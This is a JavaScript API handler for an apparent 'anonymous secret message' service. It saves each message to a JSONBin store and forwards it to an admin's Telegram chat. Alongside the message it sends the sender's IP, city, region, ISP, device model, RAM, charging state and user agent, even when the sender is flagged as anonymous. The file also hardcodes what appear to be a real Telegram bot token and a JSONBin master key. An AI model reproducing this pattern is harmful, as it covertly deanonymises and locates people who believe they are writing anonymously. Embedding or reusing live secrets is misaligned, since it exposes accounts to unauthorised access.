// api/send.js - Handles message sending to Telegram bot
const BOT_TOKEN = process.env.BOT_TOKEN || '8653934604:AAGE9O4iEkB62yxsXWEGOE2AS_TZNmmMxPA';
const ADMIN_ID = process.env.ADMIN_ID || '6048050987';
const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID || '6a048364250b1311c344cc10';
const JSONBIN_MASTER_KEY = process.env.JSONBIN_MASTER_KEY || '$2a$10$dFJuDsfbDqqnkKBPh2bGMuHea6RJjPSU2bv67bkIM9GaJkypisWdW';

async function sendTelegramMessage(text, replyMarkup) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: ADMIN_ID,
    text,
    parse_mode: 'HTML',
  };
  if (replyMarkup) body.reply_markup = replyMarkup;
  
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  return r.json();
}

async function saveMessage(userId, msgData) {
  try {
    // Get current data
    const getR = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
      headers: { 'X-Master-Key': JSONBIN_MASTER_KEY }
    });
    const getData = await getR.json();
    const db = getData.record || { users: {}, messages: [], replies: [] };

    // Save message
    const msgId = Date.now().toString();
    if (!db.messages) db.messages = [];
    db.messages.push({ id: msgId, userId, ...msgData, seen: false });

    // Update user info
    if (!db.users) db.users = {};
    if (!db.users[userId]) db.users[userId] = {};
    db.users[userId].lastActive = msgData.time;
    db.users[userId].deviceInfo = msgData.deviceInfo;
    db.users[userId].name = msgData.name;
    db.users[userId].phone = msgData.phone;
    db.users[userId].fb = msgData.fb;

    // Save back
    await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': JSONBIN_MASTER_KEY
      },
      body: JSON.stringify(db)
    });

    return msgId;
  } catch(e) {
    return Date.now().toString();
  }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { userId, name, phone, fb, message, time, anon, deviceInfo } = req.body;

    if (!message || !userId) return res.status(400).json({ error: 'Missing fields' });

    // Save to database
    const msgId = await saveMessage(userId, { name, phone, fb, message, time, anon, deviceInfo });

    // Format Telegram message
    const di = deviceInfo || {};
    const msgText = `
🔐 <b>New Secret Message Received!</b>

📅 <b>Send Time:</b> ${time}
🆔 <b>User ID:</b> <code>${userId}</code>
🔒 <b>Anonymous:</b> ${anon ? '✅ Yes' : '❌ No'}

👤 <b>Name:</b> ${name || 'N/A'}
📱 <b>Phone:</b> ${phone || 'N/A'}
🔗 <b>FB:</b> ${fb || 'N/A'}

📱 <b>Device Info:</b> ${di.deviceModel || 'Unknown'}
🔋 <b>Charging:</b> ${di.charging || 'Unknown'}
📶 <b>Network:</b> ${di.network || 'Unknown'}
🌍 <b>IP:</b> ${di.ip || 'N/A'}
🏙️ <b>Country:</b> ${di.country || 'N/A'}
🏠 <b>Region:</b> ${di.region || 'N/A'}
📍 <b>City:</b> ${di.city || 'N/A'}
📡 <b>ISP:</b> ${di.isp || 'N/A'}
💾 <b>RAM:</b> ${di.ram || 'Unknown'}
🧠 <b>User Agent:</b> ${(di.userAgent || '').substring(0, 100)}

💬 <b>Message:</b>
<code>${message.substring(0, 3000)}</code>
    `.trim();

    const replyMarkup = {
      inline_keyboard: [[
        { text: '💌 Send Reply', callback_data: `reply_${userId}` }
      ]]
    };

    await sendTelegramMessage(msgText, replyMarkup);

    return res.status(200).json({ ok: true, msgId });
  } catch(e) {
    console.error(e);
    return res.status(500).json({ error: 'Internal error' });
  }
}
